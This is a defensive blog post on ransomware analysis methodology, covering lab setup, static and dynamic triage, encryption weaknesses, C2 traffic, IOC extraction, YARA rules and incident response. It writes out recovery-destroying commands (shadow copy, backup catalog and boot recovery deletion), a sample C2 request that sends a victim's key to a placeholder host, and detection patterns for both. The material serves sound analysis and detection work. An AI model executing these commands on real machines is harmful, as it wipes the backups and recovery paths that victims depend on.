---
layout: post
title: "Ransomware Analysis — IOCs, Encryption Patterns, and C2 Communication"
date: 2026-03-22
category: "Malware Dev"
cover_image: /assets/img/covers/ransomware-cover.png
tags: [ransomware, malware-analysis, reverse-engineering, IOCs, forensics, incident-response]
excerpt: "A structured methodology for analyzing ransomware samples — from initial triage to encryption algorithm identification, IOC extraction, and C2 traffic analysis."
read_time: 22
---

Ransomware analysis is one of the most impactful skills in defensive security. Every hour saved in identifying the strain, understanding the encryption scheme, and mapping the C2 infrastructure translates directly to faster recovery and better containment. This post covers a structured methodology for going from an unknown sample to a complete behavioral and technical profile.

---

## Lab Setup — Non-Negotiable

Never analyze malware on a production machine or a VM connected to your real network.

### Isolated Analysis Environment

```
Host Machine
└── Hypervisor (VMware / VirtualBox)
    ├── Windows 10 VM (analysis target)
    │   ├── Snapshots at clean state
    │   ├── No real credentials stored
    │   └── Shared folders DISABLED
    └── REMnux VM (Linux analysis tools)
        └── INetSim running (fake internet services)

Network:
- Host-only adapter between VMs
- NO NAT, NO bridged networking
- INetSim on REMnux simulates DNS, HTTP, SMTP
```

**Tools pre-installed on Windows analysis VM:**
- Process Monitor (ProcMon)
- Process Hacker 2
- Wireshark
- x64dbg / x32dbg
- PEStudio
- Detect-It-Easy (DIE)
- Hollows Hunter
- Noriben (ProcMon automation wrapper)

**Tools on REMnux:**
- INetSim
- Wireshark
- strings, binwalk, xxd
- FLOSS (FireEye Labs Obfuscated String Solver)
- Capa

---

## Phase 1 — Static Analysis (Pre-Execution)

Never run the sample first. Always start static — you learn the most before detonation, and you preserve your clean snapshot.

### File Triage

```bash
# Hash the sample — search VirusTotal, MalwareBazaar, Any.run
md5sum sample.exe
sha256sum sample.exe

# File type identification — never trust the extension
file sample.exe
# PE32+ executable (GUI) x86-64

# Entropy analysis — high entropy = packed/encrypted
# Detect-It-Easy or binwalk
die sample.exe
```

**Entropy interpretation:**
- `< 6.0` → plaintext, minimal obfuscation
- `6.0 - 7.0` → compressed or partially obfuscated
- `7.0 - 8.0` → encrypted or packed — expect a stub that decrypts at runtime
- `~8.0` → maximum entropy — heavily packed

### PEStudio Analysis

Load the sample in PEStudio. Key areas:

**Imports (IAT):**
Ransomware has characteristic import combinations. Look for:

```
Cryptography:
- CryptAcquireContext, CryptGenKey, CryptEncrypt  → legacy WinCrypt
- BCryptOpenAlgorithmProvider, BCryptEncrypt       → modern CNG
- CryptStringToBinary, CryptBinaryToString         → base64 encode/decode

File Operations:
- FindFirstFile, FindNextFile                      → directory traversal
- CreateFile, ReadFile, WriteFile, DeleteFile      → file manipulation
- MoveFile, ReplaceFile                            → in-place encryption

Network:
- WSAStartup, connect, send, recv                  → raw sockets
- WinHttpOpen, WinHttpConnect, WinHttpSendRequest  → HTTP C2
- InternetOpen, InternetConnect                    → WinINet C2

System:
- CreateProcess, ShellExecute                      → child process spawning
- RegOpenKey, RegSetValue                          → persistence/config
- GetLogicalDrives, GetDriveType                   → drive enumeration
- NtQuerySystemInformation                         → process enumeration
```

**Strings (FLOSS for obfuscated strings):**
```bash
floss sample.exe > strings_output.txt
grep -iE "(http|https|\.onion|tor|ransom|decrypt|bitcoin|wallet|payment)" strings_output.txt
```

Look for:
- C2 URLs or IP addresses
- `.onion` addresses (Tor-based payment portals)
- Ransom note template text
- File extension the ransomware appends (`.locked`, `.enc`, `.WNCRY`)
- Mutex names (used to prevent double-execution)
- Registry keys for persistence

**CAPA — Automated Capability Detection:**
```bash
capa sample.exe
```

CAPA maps binary behavior to MITRE ATT&CK techniques without execution:
```
CAPABILITY                          NAMESPACE
encrypt files using AES via BCrypt  impact/inhibit-system-recovery
delete volume shadow copies         impact/inhibit-system-recovery
enumerate files recursively         discovery/file-and-directory-discovery
communicate via HTTP                command-and-control/web-service
persist via Run key                 persistence/registry-run-keys
```

### Identify the Packer/Crypter

If the sample is packed, static analysis of the actual payload is limited. Identify the packer first:

```bash
die sample.exe
# Output: "UPX 3.96"  → unpack with upx -d sample.exe
# Output: "MPRESS"    → use MPRESSunpacker
# Output: unknown     → manual unpacking in debugger required
```

**Manual unpacking in x64dbg:**
1. Set breakpoint on `VirtualAlloc` — packer allocates memory for unpacked payload
2. Set hardware breakpoint on memory write → detect when payload is written
3. Set breakpoint on `VirtualProtect` with `PAGE_EXECUTE` — payload is about to run
4. Dump memory at that point → `Scylla` plugin to rebuild IAT → save as unpacked PE

---

## Phase 2 — Dynamic Analysis (Controlled Execution)

Snapshot your VM. Start ProcMon, Process Hacker, Wireshark. Then detonate.

### ProcMon Filters

Set these filters before execution to reduce noise:

```
Process Name | is | sample.exe | Include
Operation    | is | RegSetValue | Include
Operation    | is | RegCreateKey | Include
Operation    | begins with | WriteFile | Include
Operation    | is | CreateFile | Include
Path         | contains | AppData | Include
Path         | contains | Startup | Include
Path         | contains | Run | Include
```

### What to Watch During Execution

**Immediate actions (first 5 seconds):**
- Mutex creation — prevents double-execution, gives you the mutex name
- Anti-analysis checks — `IsDebuggerPresent`, VM detection, sandbox detection
- Privilege escalation attempts — UAC bypass, token impersonation
- Process injection into legitimate processes

**Pre-encryption phase:**
- C2 communication — key exchange or victim registration
- Shadow copy deletion: `vssadmin delete shadows /all /quiet`
- Backup catalog deletion: `wbadmin delete catalog -quiet`
- Windows recovery disable: `bcdedit /set {default} recoveryenabled No`
- Process termination — killing database services, backup agents that lock files

**Encryption phase:**
- File enumeration pattern (FindFirstFile/FindNextFile chains)
- Which directories are targeted (Desktop, Documents, or everything)
- Which extensions are skipped (system files to keep OS bootable)
- File renaming pattern (original.docx → original.docx.locked)
- Ransom note drop location and filename

**Post-encryption:**
- Wallpaper change (ransom message)
- Ransom note opened in Notepad/browser
- Self-deletion or persistence establishment

### Hollows Hunter — Memory Artifacts

```bash
hollows_hunter.exe /dir C:\analysis\dumps
```

Detects and dumps:
- Hollowed processes
- Injected shellcode
- Reflectively loaded DLLs
- Modified PE headers

The dumped images can be analyzed as full PE files even if they never touched disk.

---

## Phase 3 — Encryption Analysis

This is the critical phase — understanding the encryption determines whether decryption is possible.

### Identifying the Algorithm

**From imports:**
```
BCryptOpenAlgorithmProvider("AES") → AES
BCryptOpenAlgorithmProvider("RSA") → RSA
CryptAcquireContext + CALG_AES_256 → WinCrypt AES-256
CryptAcquireContext + CALG_RC4     → RC4 (weak, older ransomware)
```

**From strings:**
```bash
strings sample.exe | grep -iE "(aes|rsa|chacha|salsa|curve25519|secp256)"
```

**From binary patterns in x64dbg:**
The AES S-box is a known constant — search for it in memory:
```
# AES S-box starts with: 63 7C 77 7B F2 6B 6F C5
# Search in memory dump for this byte sequence
```

### The Hybrid Encryption Scheme

Modern ransomware never encrypts files directly with asymmetric crypto — it's too slow. The standard scheme:

```
Attacker keypair: RSA-2048 or RSA-4096
  Public key: embedded in malware binary
  Private key: held by attacker (needed for decryption)

Per-victim key generation:
  1. Generate random AES-256 key (symmetric, fast)
  2. Encrypt files with AES-256 (CBC or CTR mode)
  3. Encrypt the AES key with attacker's RSA public key
  4. Store encrypted AES key in ransom note or file header
  5. Wipe plaintext AES key from memory

Recovery only possible if:
  - Attacker provides RSA private key (pays ransom)
  - AES key wasn't properly wiped (memory forensics)
  - Implementation bug in key generation (weak RNG)
  - Key exchange with C2 was intercepted (network forensics)
```

**Per-file vs per-session keying:**
- Per-file: each file gets a unique AES key → encrypted with RSA → stored in file header
- Per-session: one AES key for all files in the session → only one RSA-encrypted blob

Per-file is more secure from the attacker's perspective but slower.

### Identifying Implementation Weaknesses

This is where decryption becomes possible without paying.

**Weak RNG:**
If the ransomware uses `rand()` or time-based seeding instead of `CryptGenRandom` / `BCryptGenRandom`:
```c
// Weak — predictable seed
srand(GetTickCount());
for (int i = 0; i < 32; i++) key[i] = rand() % 256;

// Strong — cryptographically secure
BCryptGenRandom(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
```

If the seed is predictable (timestamp at infection time), you can brute-force the key space.

**Key reuse:**
Some ransomware families use the same key for all victims (lazy implementation). Once one victim shares their decryptor, it works for everyone.

**Key in memory:**
If the AES key isn't wiped from memory immediately after encrypting each file, it may still be present:
```bash
# Dump process memory during encryption
# Search for 32-byte (AES-256) or 16-byte (AES-128) entropy blocks
# Compare candidates against encrypted file headers
```

**Stream cipher keystream reuse:**
If using a stream cipher (RC4, ChaCha20) with the same key+nonce for multiple files → XOR two ciphertexts to cancel the keystream → recover plaintext with known-plaintext attack.

---

## Phase 4 — C2 Communication Analysis

### Network Traffic in Wireshark

Filter for the sample's traffic:
```
ip.src == <VM_IP>
```

**What to look for:**

**DNS queries:**
```
# Domain generation algorithm (DGA) — many failed lookups
# C2 domain registration pattern
# .onion resolution attempts (won't resolve without Tor)
```

**HTTP/S C2:**
Common patterns:
```http
POST /gate.php HTTP/1.1
Host: c2-domain.com
Content-Type: application/x-www-form-urlencoded

uid=<victim_id>&key=<base64_encrypted_aes_key>&os=Win10&hostname=DESKTOP-XXX
```

The victim registration request typically contains:
- Unique victim identifier (hardware hash, hostname hash)
- Encrypted symmetric key (to be stored by attacker)
- System information
- Sometimes: screenshot, file listing

**Decoding the traffic:**
```bash
# Extract base64 payload
echo "BASE64STRING" | base64 -d | xxd | head -20

# If encrypted with a known algorithm, check for magic bytes
# AES-CBC: no magic, just ciphertext
# RSA: check for PKCS#1 padding (0x00 0x02 ...)
```

### INetSim — Simulating C2 Response

With INetSim running, the malware's HTTP requests get fake responses. Watch what the malware does when:
- C2 responds with 200 OK + empty body
- C2 responds with specific data
- C2 is unreachable (DNS fails)

Some ransomware has a **killswitch** — if C2 is unreachable, it aborts encryption. WannaCry's unregistered domain was exactly this.

Some ransomware **requires** a C2 response containing the RSA public key before encrypting — if C2 is down, no encryption happens. This is a containment vector: sinkhole the C2 domain.

### Tor-Based C2

Most modern ransomware uses `.onion` for the payment portal. The malware itself may communicate over clearnet for key exchange but direct victims to Tor for payment.

```bash
# Extract .onion addresses from strings
strings sample.exe | grep "\.onion"

# Or from network traffic if Tor client is embedded
# Tor traffic: port 9001 (relay), 9050 (SOCKS proxy)
# Detect by entropy of payload + port
```

---

## Phase 5 — IOC Extraction

Compile everything into actionable indicators.

### IOC Categories

**File-based:**
```yaml
hashes:
  md5: <hash>
  sha256: <hash>
  
filenames:
  - HOW_TO_DECRYPT.txt
  - README_LOCKED.html
  - RECOVER_FILES.txt

file_extensions_appended:
  - .locked
  - .enc  
  - .WNCRY
  - .[random_8_chars]

dropped_files:
  - %APPDATA%\<malware_name>.exe
  - %TEMP%\<random>.bat (self-delete script)
```

**Registry:**
```yaml
persistence:
  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<name>
  
configuration:
  - HKCU\Software\<malware_family>\<victim_id>
  - HKCU\Software\<malware_family>\encrypted_key
```

**Network:**
```yaml
c2_domains:
  - domain1.com
  - domain2.net
  
c2_ips:
  - x.x.x.x
  
payment_portals:
  - <hash>.onion
  
user_agents:
  - "Mozilla/5.0 (custom string used by malware)"
  
uri_patterns:
  - /gate.php
  - /api/v1/register
```

**Behavioral:**
```yaml
mutex:
  - Global\<mutex_name>  # prevents double-execution

commands_executed:
  - vssadmin delete shadows /all /quiet
  - bcdedit /set {default} recoveryenabled No
  - wbadmin delete catalog -quiet
  - net stop <backup_service>
  - taskkill /f /im <database_process>.exe

processes_injected:
  - explorer.exe
  - svchost.exe
```

### YARA Rule Creation

```yara
rule Ransomware_Generic_Indicators
{
    meta:
        description = "Generic ransomware behavioral indicators"
        author = "muhamad0x"
        date = "2026-03-22"

    strings:
        // VSS deletion — near-universal ransomware behavior
        $vss1 = "vssadmin delete shadows" ascii nocase
        $vss2 = "wbadmin delete catalog" ascii nocase
        $vss3 = "bcdedit" ascii nocase

        // Ransom note filenames
        $note1 = "HOW_TO_DECRYPT" ascii nocase
        $note2 = "README_LOCKED" ascii nocase
        $note3 = "RECOVER_FILES" ascii nocase

        // Crypto API imports
        $api1 = "BCryptOpenAlgorithmProvider" ascii
        $api2 = "CryptEncrypt" ascii
        $api3 = "BCryptEncrypt" ascii

        // File enumeration
        $enum1 = "FindFirstFileW" ascii
        $enum2 = "FindNextFileW" ascii

    condition:
        uint16(0) == 0x5A4D  // MZ header
        and (1 of ($vss*))
        and (1 of ($note*))
        and (1 of ($api*))
        and all of ($enum*)
}
```

**Family-specific YARA** — once you identify the strain, add unique strings:
```yara
rule RansomwareFamily_XYZ
{
    strings:
        $unique1 = { E8 ?? ?? ?? ?? 48 8B C8 E8 ?? ?? ?? ?? }  // unique bytecode sequence
        $cfg_key = "specific_config_string_unique_to_family"

    condition:
        uint16(0) == 0x5A4D and all of them
}
```

---

## Phase 6 — Family Attribution

Once you have IOCs, match against known families.

### Identification Resources

```
VirusTotal      → hash lookup, behavioral reports, community comments
MalwareBazaar   → sample database with tags and family names
Any.run         → interactive sandbox with family detection
Triage          → automated sandbox, good YARA coverage
ID Ransomware   → upload ransom note or encrypted file → identify family
```

### Known Family Characteristics

| Family | Encryption | C2 Method | VSS Deletion | Notable |
|---|---|---|---|---|
| LockBit 3.0 | AES-256 + RSA-2048 | HTTPS + .onion | Yes | Fastest encryptor, UEFI capable |
| BlackCat/ALPHV | AES-256 + RSA-4096 | HTTPS | Yes | Written in Rust |
| Conti | AES-256 + RSA-4096 | HTTPS | Yes | Leaked source code |
| REvil/Sodinokibi | Salsa20 + Curve25519 | HTTPS + .onion | Yes | Defunct, operators arrested |
| WannaCry | AES-128-CBC + RSA-2048 | SMB propagation | No | Killswitch, EternalBlue |
| Ryuk | AES-256 + RSA-4096 | Via TrickBot/BazarLoader | Yes | Manual deployment, big game hunting |
| Dharma | AES-256 + RSA-1024 | Email-based | Yes | Weak RSA-1024 — decryptors exist |

---

## Post-Analysis — Incident Response Integration

The analysis output feeds directly into IR:

**Containment:**
- Block C2 IPs/domains at perimeter immediately
- Sinkhole the C2 domain if possible (stops key exchange → may halt encryption on unaffected hosts)
- Isolate affected network segments

**Eradication:**
- Hunt for persistence mechanisms found in analysis
- Scan all hosts with YARA rules extracted from sample
- Check for lateral movement using the mutex name and file artifacts

**Recovery:**
- Determine if decryption is possible (weak RNG, key in memory, known decryptor exists)
- Check No More Ransom project (nomoreransom.org) for free decryptors
- Prioritize restoring from backups not connected during encryption window

**Lessons learned:**
- Map the initial access vector from the sample's dropper
- Timeline the infection from ProcMon logs + Windows Event Logs
- Determine blast radius from file system artifacts
